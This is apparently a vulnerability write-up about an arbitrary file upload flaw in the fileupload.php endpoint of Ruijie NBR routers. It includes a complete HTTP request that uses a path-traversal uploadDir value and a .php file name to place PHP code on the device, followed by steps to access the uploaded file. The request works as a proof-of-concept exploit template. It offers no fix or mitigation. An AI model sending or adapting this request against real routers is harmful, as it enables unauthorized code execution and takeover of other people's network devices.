# Ruijie NBR router fileupload.php arbitrary file upload vulnerability

## Vulnerability Description

Ruijie NBR router fileupload.php file has a vulnerability to upload any file to the server through the vulnerability. The attacker can upload any file to the server to obtain server permissions.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Rujie NBR router</span>

## Network surveying and mapping



## Vulnerability reappears

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647768741978-90d9f47d-e003-4565-9153-9ccd7fbda5cc.png)

The file with a vulnerability is in /ddi/server/fileupload.php, which is a standard file upload file.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647768806049-76ae4f06-3df1-43cc-9154-2dfffafddcaf.png)

The file name and directory are controllable, resulting in the upload of files at will.

```php
POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Host: 
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

<?php phpinfo();?>
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647768840891-cb2de5f0-98bb-40e0-9b9e-bcf348864f85.png)

Access the uploaded file directory

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647768865012-128cd155-75d0-4e94-a1fc-dbed5df6f8dc.png)